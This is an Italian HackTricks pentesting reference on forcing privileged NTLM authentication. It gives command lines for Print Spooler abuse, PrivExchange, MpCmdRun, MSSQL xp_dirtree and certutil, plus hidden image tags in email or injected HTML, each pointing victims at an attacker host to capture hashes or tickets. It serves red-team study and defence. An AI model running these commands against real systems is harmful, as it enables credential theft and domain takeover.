# Forzare l'autenticazione privilegiata NTLM

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **raccolta** di **trigger di autenticazione remota** codificati in C# utilizzando il compilatore MIDL per evitare dipendenze di terze parti.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato**, è possibile utilizzare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a qualche sistema**.\
Si noti che quando la stampante invia la notifica a un sistema arbitrario, è necessario **autenticarsi** su tale **sistema**. Pertanto, un attaccante può fare in modo che il servizio _**Print Spooler**_ si autentichi su un sistema arbitrario e il servizio **utilizzerà l'account del computer** in questa autenticazione.

### Trovare i server Windows nel dominio

Utilizzando PowerShell, ottenere un elenco di Windows boxes. Di solito i server hanno la priorità, quindi concentriamoci su di essi:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Trovare i servizi Spooler in ascolto

Utilizzando una versione leggermente modificata di @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche utilizzare rpcdump.py su Linux e cercare il protocollo MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Richiedere al servizio di autenticarsi su un host arbitrario

Puoi compilare [**SpoolSample da qui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oppure utilizza [**dementor.py di 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinazione con Delega non vincolata

Se un attaccante ha già compromesso un computer con [Delega non vincolata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante su questo computer**. A causa della delega non vincolata, il **TGT** dell'**account del computer della stampante** verrà **salvato nella memoria** del computer con delega non vincolata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e sfruttarlo ([Pass the Ticket](pass-the-ticket.md)).

## Autenticazione forzata RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attacco `PrivExchange` è il risultato di una falla trovata nella funzionalità **PushSubscription del server Exchange**. Questa funzionalità consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta a autenticarsi su qualsiasi host fornito dal client tramite HTTP.

Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e viene fornito con privilegi eccessivi (in particolare, ha **privilegi WriteDacl sull'aggiornamento cumulativo pre-2019 del dominio**). Questa falla può essere sfruttata per abilitare il **trasferimento di informazioni a LDAP ed estrarre successivamente il database NTDS del dominio**. Nei casi in cui il trasferimento a LDAP non sia possibile, questa falla può comunque essere utilizzata per trasferire e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede un accesso immediato all'Amministratore di dominio con qualsiasi account utente di dominio autenticato.

## All'interno di Windows

Se sei già all'interno della macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) è un sistema di gestione di database relazionali sviluppato da Microsoft. È ampiamente utilizzato per archiviare e gestire grandi quantità di dati in modo efficiente. MSSQL offre una vasta gamma di funzionalità avanzate, come la gestione transazionale, l'ottimizzazione delle query e la sicurezza dei dati. È spesso utilizzato nelle applicazioni aziendali per supportare operazioni critiche e complesse.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Oppure utilizza questa altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile utilizzare certutil.exe (un binario firmato da Microsoft) per costringere l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Iniezione HTML

### Tramite email

Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli una **email con un'immagine 1x1** come questa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando lo apre, cercherà di autenticarsi.

### MitM

Se riesci a eseguire un attacco MitM a un computer e iniettare HTML in una pagina che visualizzerà, puoi provare a iniettare un'immagine come quella seguente nella pagina:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Se riesci a catturare le sfide NTLMv1, leggi qui come craccarle.\
_Ricorda che per craccare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
